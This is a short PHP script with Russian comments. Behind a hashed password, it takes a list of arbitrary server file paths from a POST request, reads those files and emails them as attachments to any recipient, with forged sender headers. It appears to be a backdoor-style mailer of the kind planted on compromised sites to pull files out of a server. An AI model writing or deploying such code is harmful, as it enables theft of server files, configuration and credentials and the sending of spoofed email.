<?php /*18.09.16
отправить файлы на почту mail.php
POST 
s=pass~Кому~тема
txt(html)
file(путь1~путь2~путь3~)
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
$s=explode('*',file_get_contents('./p.php'));
if(md5($_POST['p'])!=$s[1]){exit('[X] PASS');}
$s=explode('~',$_POST['s']);

$file_arr=explode('~',$_POST['file_str']);

  /*Куда, тема, $_SERVER['SERVER_ADMIN']*/
  if(XMail( $s[3], $s[1], $s[2], $_POST['txt'], $file_arr)){
    echo '[V]';
  }else{
   echo '[X]'; 
  }; //Отправляем письмо

echo ' mail ' . $s[1];


function XMail( $from, $to, $subj, $text, $files)
{
 
$un = strtoupper(uniqid(time()));
$head = 'From: '.$from."\n";
  $head .='Reply-To: '.$from."\r\n";
  $head .= 'Bcc: ' .$from. "\r\n"; 
//$head .= "To: $to\n";
$head .= "Subject: $subj\n";
$head .= "X-Mailer: PHPMail Tool\n";
$head .= "Reply-To: $from\n";
$head .= "Mime-Version: 1.0\n";
$head .= "Content-Type:multipart/mixed;";
$head .= "boundary=\"----------".$un."\"\n\n";
$zag = "------------".$un."\nContent-Type:text/html;\n";
$zag .= "Content-Transfer-Encoding: 8bit\n\n$text\n\n";
 
foreach($files as $key=>$value){
     if(file_exists($value)){
    if(!is_dir($value)){ 
        
$filename = $value;
$f = $value['num'];
$f = fopen($value,"rb");
 
$zag .= "------------".$un."\n";
$zag .= "Content-Type: application/octet-stream;";
$zag .= "name=\"".basename($filename)."\"\n";
$zag .= "Content-Transfer-Encoding:base64\n";
$zag .= "Content-Disposition:attachment;";
$zag .= "filename=\"".basename($filename)."\"\n\n";
$zag .= chunk_split(base64_encode(fread($f,filesize($filename))))."\n";
 
}}}
 
if (!@mail("$to", "$subj", $zag, $head))
return 0;
else
return 1;
}

?>